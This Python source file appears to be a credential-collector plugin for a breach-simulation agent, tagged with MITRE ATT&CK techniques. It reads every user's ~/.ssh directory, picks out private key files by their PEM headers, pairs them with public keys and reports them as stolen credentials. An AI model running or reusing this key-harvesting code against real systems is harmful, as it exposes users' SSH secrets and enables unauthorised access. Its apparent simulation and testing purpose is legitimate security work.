import logging
import pwd
import re
import time
from pathlib import PosixPath
from typing import Any, Dict, Iterable, Mapping, Optional, Sequence

from common.agent_events import CredentialsStolenEvent
from common.credentials import Credentials, SSHKeypair, Username
from common.event_queue import IAgentEventPublisher
from common.tags import (
    DATA_FROM_LOCAL_SYSTEM_T1005_TAG,
    OS_CREDENTIAL_DUMPING_T1003_TAG,
    UNSECURED_CREDENTIALS_T1552_TAG,
)
from common.types import AgentID, Event

logger = logging.getLogger(__name__)

LinuxUsername = str
UserDirectories = Dict[LinuxUsername, PosixPath]

DOT_SSH = ".ssh"
SSH_CREDENTIAL_COLLECTOR_TAG = "ssh-credentials-collector"

SSH_COLLECTOR_EVENT_TAGS = frozenset(
    (
        SSH_CREDENTIAL_COLLECTOR_TAG,
        OS_CREDENTIAL_DUMPING_T1003_TAG,
        DATA_FROM_LOCAL_SYSTEM_T1005_TAG,
        UNSECURED_CREDENTIALS_T1552_TAG,
    )
)

SSL_FILE_PATTERNS = [
    r"-----BEGIN\sRSA\sPRIVATE",
    r"-----BEGIN\sDSA\sPRIVATE",
    r"-----BEGIN\sEC\sPRIVATE",
    r"-----BEGIN\sECDSA\sPRIVATE",
]


class Plugin:
    def __init__(self, *, agent_id: AgentID, agent_event_publisher: IAgentEventPublisher, **kwargs):
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher

    def run(
        self, *, options=Mapping[str, Any], interrupt: Event, **kwargs
    ) -> Sequence[Credentials]:
        logger.info("Started scanning for SSH credentials")
        timestamp = time.time()

        try:
            stolen_credentials = _steal_credentials()
        except Exception:
            logger.exception(
                "An unexpected error occurred while attempting to steal SSH credentials"
            )
            return []

        logger.info(f"Stole {len(stolen_credentials)} SSH credentials")

        if len(stolen_credentials) > 0:
            self._publish_credentials_stolen_event(timestamp, stolen_credentials)

        return stolen_credentials

    def _publish_credentials_stolen_event(
        self,
        timestamp: float,
        collected_credentials: Sequence[Credentials],
    ):
        credentials_stolen_event = CredentialsStolenEvent(
            timestamp=timestamp,
            source=self._agent_id,
            tags=SSH_COLLECTOR_EVENT_TAGS,
            stolen_credentials=collected_credentials,
        )

        self._agent_event_publisher.publish(credentials_stolen_event)


def _steal_credentials() -> Sequence[Credentials]:
    stolen_credentials = []

    for username, ssh_dir in _get_ssh_dirs().items():
        identity = Username(username=username)

        try:
            for keypair in _steal_keypairs(ssh_dir):
                stolen_credentials.append(Credentials(identity=identity, secret=keypair))
        except (IOError, OSError) as err:
            logger.debug(f"Failed to search for SSH Keys for user {username}: {err}")

    return stolen_credentials


def _get_ssh_dirs() -> UserDirectories:
    try:
        home_dirs = {p.pw_name: PosixPath(p.pw_dir) for p in pwd.getpwall()}
    except Exception:
        logger.exception("Failed to get SSH directories")
        return {}

    ssh_dirs = {}
    for username, home_dir in home_dirs.items():
        ssh_dir = home_dir / DOT_SSH
        try:
            if ssh_dir.is_dir():
                ssh_dirs[username] = ssh_dir
        except PermissionError as err:
            logger.debug(err)
        except Exception:
            logger.exception(f"Failed to get SSH directory for {username}")

    return ssh_dirs


def _steal_keypairs(ssh_dir: PosixPath) -> Iterable[SSHKeypair]:
    stolen_keypairs = []
    for file in filter(lambda f: f.is_file(), ssh_dir.iterdir()):
        if not _file_is_private_key(file):
            continue

        private_key = file.read_text()
        public_key = _find_public_key(file)
        keypair = SSHKeypair(private_key=private_key, public_key=public_key)

        stolen_keypairs.append(keypair)

    return stolen_keypairs


def _file_is_private_key(file: PosixPath) -> bool:
    try:
        file_data = file.read_text()[:1024]
        for pattern in SSL_FILE_PATTERNS:
            if re.search(pattern, file_data):
                return True
        return False
    except (IOError, OSError) as err:
        logger.debug(f"Received an error while reading {file}: {err}")
        return False


def _find_public_key(private_key_file: PosixPath) -> Optional[str]:
    try:
        public_key_file = private_key_file.with_suffix(".pub")
        if public_key_file.is_file():
            return public_key_file.read_text()
    except (IOError, OSError) as err:
        logger.debug(f"Received an error while reading {public_key_file}: {err}")

    return None
